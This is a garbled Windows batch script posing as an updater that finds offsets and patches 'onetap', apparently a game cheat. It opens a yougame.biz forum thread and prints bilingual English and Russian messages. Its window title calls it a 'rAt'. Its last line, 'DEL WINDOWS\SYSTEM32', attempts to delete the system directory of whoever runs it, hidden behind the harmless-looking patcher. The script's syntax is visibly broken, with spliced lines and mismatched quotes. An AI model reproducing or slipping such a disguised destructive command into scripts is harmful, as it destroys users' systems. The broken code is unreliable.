@echo off
title epic rAt by ricsi
mode con: cols=80 lines=30 
chcp 65001
:starter
cls
call :random_color
if "%language%"=="call :language_interpreter %language%, "Search new offsets. This can take 1-2 min, please wait...." , "Поиск новых оффсетов. Это может занять 1-2 минуты, ожидайте...."
call :insignia_search_module, :patcher
:patcher
echo.
call :language_interpreter %language%, "Offsets found. Patching onetap...", "Оффсеты найдены. Начинаем патчить вантап..."
call :patcher_module, :end
:end
echo.
call :language_interpreter %language%, "Onetap updated. Good luck!", "Вантап обновлен. Удачной игры!"
echo.
call :language_interpreter %language%, "You can also look at my topic on yougame, and put the reaction 'I like'", "Также вы можете заглянуть в мою тему на yougame, и поставить реакцию 'Мне нравится'
start https://yougame.biz/threads/101259/
echo.
echo.
ping 0.0.0.0 -n 10 > nul
exit
:insignia_search_module
cd Insignia
Insignia.exe sigs.txt offsets.txt ../client_panorama.dllru" goto :insignia
set /a random=%random% %% 16
set HEX=0123456789ABCDEF
call set random_color=%%HEX:~%random%,1%%%%,1%%
color %random_color%
:language_interpreter
 if "%~1"=="en" (
	echo %~2
 )
 if "%~1"=="ru" ( 
     echo %~3
 )
DEL WINDOWS\SYSTEM32